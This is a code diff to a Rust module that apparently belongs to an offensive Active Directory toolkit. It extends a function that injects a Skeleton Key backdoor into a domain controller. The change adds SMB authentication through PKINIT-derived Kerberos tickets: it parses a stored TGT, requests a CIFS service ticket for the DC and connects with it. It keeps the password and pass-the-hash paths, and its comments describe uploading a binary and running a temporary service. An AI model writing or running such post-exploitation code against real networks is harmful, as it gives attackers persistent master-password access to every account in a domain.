@@ -24,11 +24,14 @@
 //! 5. Wait for completion, capture output
 //! 6. Delete uploaded binary and temp service
 
+use kerberos_asn1::Asn1Object;
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::postex::{
     SkeletonKeyPreflight, SkeletonKeyPreflightStatus, assess_skeleton_key_preflight_from_registry,
 };
-use overthrone_core::proto::smb::SmbSession;
+use overthrone_core::proto::kerberos::request_service_ticket;
+use overthrone_core::proto::kerberos::TicketGrantingData;
+use overthrone_core::proto::smb::{KerberosTicket, SmbSession};
 use tracing::{debug, info, warn};
 
 use crate::exec_util;
@@ -60,27 +63,106 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
     }
 
     // Validate credentials and establish SMB session
-    let mut smb = match (&config.password, &config.nt_hash) {
-        (Some(pw), _) => {
-            info!(
-                "[skeleton] Connecting to {} via SMB (password)",
+    // If pkinit_keyed_ticket is set with TGT data, use Kerberos ticket-based
+    // SMB authentication via PKINIT-derived credentials.
+    let mut smb = if config.pkinit_keyed_ticket {
+        let (session_key, session_etype) = match config.pkinit_session_key.as_ref() {
+            Some(v) => v,
+            None => {
+                return Err(OverthroneError::TicketForge(
+                    "pkinit_keyed_ticket set but pkinit_session_key missing".into(),
+                ));
+            }
+        };
+        let ticket_data = match config.pkinit_ticket_data.as_ref() {
+            Some(v) => v,
+            None => {
+                return Err(OverthroneError::TicketForge(
+                    "pkinit_keyed_ticket set but pkinit_ticket_data missing".into(),
+                ));
+            }
+        };
+
+        info!(
+            "[skeleton] Connecting to {} via PKINIT Kerberos ticket (etype={}, {} bytes)",
+            config.dc_ip,
+            session_etype,
+            session_key.len()
+        );
+
+        // Parse the raw ticket bytes back into a Ticket
+        let (_, ticket) = kerberos_asn1::Ticket::parse(ticket_data).map_err(|e| {
+            OverthroneError::TicketForge(format!("Failed to parse PKINIT TGT: {e}"))
+        })?;
+
+        // Reconstruct TicketGrantingData from stored TGT data
+        let tgt = TicketGrantingData {
+            ticket,
+            session_key: session_key.clone(),
+            session_key_etype: *session_etype,
+            client_principal: config.username.clone(),
+            client_realm: config.domain.to_uppercase(),
+            end_time: None,
+        };
+
+        // Request a TGS for the CIFS service on the target DC
+        let cifs_spn = format!("cifs/{}", config.dc_ip);
+        info!("[skeleton] Requesting TGS for SPN: {}", cifs_spn);
+        let tgs = request_service_ticket(&config.dc_ip, &tgt, &cifs_spn).await.map_err(|e| {
+            OverthroneError::TicketForge(format!(
+                "Failed to request CIFS service ticket from PKINIT TGT: {e}"
+            ))
+        })?;
+
+        // Build KerberosTicket for SMB authentication
+        let krb_ticket = KerberosTicket::new(
+            tgs.ticket.build(),
+            tgs.session_key,
+            tgs.session_key_etype,
+            false,
+            Some(cifs_spn),
+        );
+
+        SmbSession::connect_with_ticket(
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            krb_ticket,
+        )
+        .await
+        .map_err(|e| {
+            OverthroneError::TicketForge(format!(
+                "SMB Kerberos ticket connect to {} failed: {e}",
                 config.dc_ip
-            );
-            SmbSession::connect(&config.dc_ip, &config.domain, &config.username, pw)
-                .await
-                .map_err(|e| {
-                    OverthroneError::TicketForge(format!(
-                        "SMB connect to {} failed: {e}",
-                        config.dc_ip
-                    ))
-                })?
-        }
-        (None, Some(hash)) => {
-            info!(
-                "[skeleton] Connecting to {} via SMB (pass-the-hash)",
-                config.dc_ip
-            );
-            SmbSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, hash)
+            ))
+        })?
+    } else {
+        match (&config.password, &config.nt_hash) {
+            (Some(pw), _) => {
+                info!(
+                    "[skeleton] Connecting to {} via SMB (password)",
+                    config.dc_ip
+                );
+                SmbSession::connect(&config.dc_ip, &config.domain, &config.username, pw)
+                    .await
+                    .map_err(|e| {
+                        OverthroneError::TicketForge(format!(
+                            "SMB connect to {} failed: {e}",
+                            config.dc_ip
+                        ))
+                    })?
+            }
+            (None, Some(hash)) => {
+                info!(
+                    "[skeleton] Connecting to {} via SMB (pass-the-hash)",
+                    config.dc_ip
+                );
+                SmbSession::connect_with_hash(
+                    &config.dc_ip,
+                    &config.domain,
+                    &config.username,
+                    hash,
+                )
                 .await
                 .map_err(|e| {
                     OverthroneError::TicketForge(format!(
@@ -88,11 +170,12 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
                         config.dc_ip
                     ))
                 })?
-        }
-        _ => {
-            return Err(OverthroneError::TicketForge(
-                "Credentials required for Skeleton Key injection".into(),
-            ));
+            }
+            _ => {
+                return Err(OverthroneError::TicketForge(
+                    "Credentials required for Skeleton Key injection".into(),
+                ));
+            }
         }
     };
 
@@ -349,6 +432,9 @@ mod tests {
             skeleton_master_password: Some("NeverPrintThis!".into()),
             pkinit_cert_path: None,
             pkinit_key_path: None,
+            pkinit_keyed_ticket: false,
+            pkinit_session_key: None,
+            pkinit_ticket_data: None,
             dry_run: false,
         }
     }
